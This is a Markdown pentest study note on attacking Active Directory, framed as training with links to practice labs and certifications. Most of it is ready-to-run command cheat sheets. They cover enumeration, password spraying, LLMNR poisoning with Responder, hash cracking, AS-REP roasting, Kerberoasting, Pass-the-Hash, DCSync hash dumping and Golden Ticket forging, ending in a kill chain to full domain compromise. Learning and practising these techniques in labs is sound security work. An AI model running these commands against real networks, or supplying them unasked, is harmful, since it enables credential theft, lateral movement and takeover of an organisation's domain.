# Active Directory Basics

Most enterprise internal pentests hit Active Directory (AD). If you plan to do corporate work, AD is not optional.

## Core concepts

- **Domain Controller (DC)** - authenticates users, holds the crown jewels (NTDS.dit)
- **Kerberos** - default auth protocol; tickets (TGT, TGS) can be abused
- **LDAP** - directory queries for users, groups, computers
- **Trust relationships** - child domains, forest trusts expand attack paths

## Common attack paths

1. **Initial access** - phishing, password spray, or exploit on edge system
2. **Enumeration** - BloodHound maps paths to Domain Admin
3. **Credential theft** - Kerberoasting, AS-REP roasting, LLMNR poisoning
4. **Lateral movement** - Pass-the-Hash, WMI, PsExec, RDP
5. **Domain dominance** - DCSync, Golden Ticket

## Essential tools

| Tool | Use |
|------|-----|
| [BloodHound](https://github.com/BloodHoundAD/BloodHound) | Visualize AD attack paths |
| [Impacket](https://github.com/fortra/impacket) | Python AD attack toolkit |
| [Rubeus](https://github.com/GhostPack/Rubeus) | Kerberos abuse |
| [CrackMapExec](https://github.com/Porchetta-Industries/CrackMapExec) | SMB/WinRM spraying |
| [PowerView](https://github.com/PowerShellMafia/PowerSploit) | AD enumeration |

## Enumeration cheat sheet

```bash
# Unauthenticated / low-priv discovery
nmap -p 88,135,139,389,445,636,3268,5985 -sV dc.domain.local
enum4linux-ng -A dc.domain.local
crackmapexec smb 10.10.10.0/24                 # find DCs, hostnames, SMB signing
ldapsearch -x -H ldap://dc -b "dc=domain,dc=local"   # anonymous LDAP

# With credentials
crackmapexec smb dc -u user -p pass --users     # domain users
crackmapexec smb dc -u user -p pass --groups
crackmapexec smb dc -u user -p pass --shares
GetADUsers.py -all domain.local/user:pass -dc-ip 10.10.10.10
bloodhound-python -d domain.local -u user -p pass -c All -ns 10.10.10.10
```

## Key attacks and how to run them

```bash
# 1. Password spraying (one password, many users - avoids lockout)
crackmapexec smb dc -u users.txt -p 'Winter2024!' --continue-on-success

# 2. LLMNR/NBT-NS poisoning -> capture NetNTLMv2 hashes
sudo responder -I eth0 -wF
hashcat -m 5600 hashes.txt rockyou.txt

# 3. AS-REP Roasting (users with "no preauth")
GetNPUsers.py domain.local/ -usersfile users.txt -no-pass -dc-ip 10.10.10.10
hashcat -m 18200 asrep.txt rockyou.txt

# 4. Kerberoasting (see Kerberoasting.md)
GetUserSPNs.py domain.local/user:pass -request -dc-ip 10.10.10.10

# 5. Pass-the-Hash lateral movement
crackmapexec smb 10.10.10.0/24 -u admin -H <NTLM_HASH>
psexec.py -hashes :<NTLM> administrator@10.10.10.20

# 6. DCSync (dump all domain hashes with replication rights)
secretsdump.py domain.local/admin@dc -just-dc

# 7. Golden Ticket (with krbtgt hash - full domain persistence)
ticketer.py -nthash <krbtgt_hash> -domain-sid <SID> -domain domain.local Administrator
```

## The kill chain (typical internal engagement)

```text
Responder/spray -> creds -> BloodHound -> Kerberoast/AS-REP -> crack ->
lateral (PtH/PsExec) -> local admin -> dump LSASS (mimikatz) ->
find path to DA -> DCSync -> Golden Ticket / NTDS.dit = domain owned
```

## Practice labs

- [TryHackMe - Attacktive Directory](https://tryhackme.com/room/attacktivedirectory)
- [HackTheBox - Active Directory paths](https://www.hackthebox.com)
- [CRTP course labs](https://www.pentesteracademy.com/red-team-labs)

## Certs

- [CRTP](Certifications/CRTP.md) - recommended after OSCP for AD focus
